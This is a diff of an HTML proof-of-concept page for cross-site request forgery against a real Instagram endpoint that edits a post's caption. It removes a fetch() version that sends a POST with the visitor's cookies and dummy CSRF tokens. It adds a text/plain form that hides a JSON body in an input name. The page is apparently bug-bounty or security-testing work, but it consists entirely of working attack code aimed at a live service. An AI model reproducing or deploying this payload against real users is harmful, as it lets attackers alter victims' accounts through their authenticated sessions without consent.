@@ -1,68 +1,18 @@
 <!doctype html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>CSRF PoC</title>
-</head>
-
+<html>
 <body>
-  <h2>CSRF Demonstration</h2>
-  <button id="run">Run test</button>
-  <pre id="out">Ready</pre>
+<h3>CSRF form test</h3>
 
-<script>
-const out = document.getElementById("out");
+<form action="https://www.instagram.com/api/v1/media/3994565454382745570/edit_media"
+      method="POST"
+      enctype="text/plain">
 
-document.getElementById("run").onclick = async () => {
+  <input type="hidden"
+         name='{"caption_text":"CSRF_FORM_TEST","fb_dtsg":"x"}'
+         value="">
 
-  out.textContent = "Sending request...";
-
-  const body = {
-    caption_text: "CSRF_TEST",
-    coauthor_invites: JSON.stringify({
-      added: [],
-      in: [],
-      removed: []
-    }),
-    usertags: JSON.stringify({
-      added: [],
-      in: [],
-      removed: []
-    }),
-    jazoest: "00000",
-    fb_dtsg: "arbitrary-value"
-  };
-
-  try {
-    const response = await fetch(
-      "https://www.instagram.com/api/v1/media/3994565454382745570/edit_media",
-      {
-        method: "POST",
-        credentials: "include",
-
-        headers: {
-          "Content-Type": "application/json",
-          "X-Csrftoken": "arbitrary-value"
-        },
-
-        body: JSON.stringify(body)
-      }
-    );
-
-    const text = await response.text();
-
-    out.textContent =
-      "Status: " + response.status + "\n\n" +
-      text;
-
-  } catch (error) {
-    out.textContent =
-      "Browser blocked/failed the request:\n\n" +
-      error;
-  }
-};
-</script>
+  <button type="submit">Test</button>
+</form>
 
 </body>
 </html>
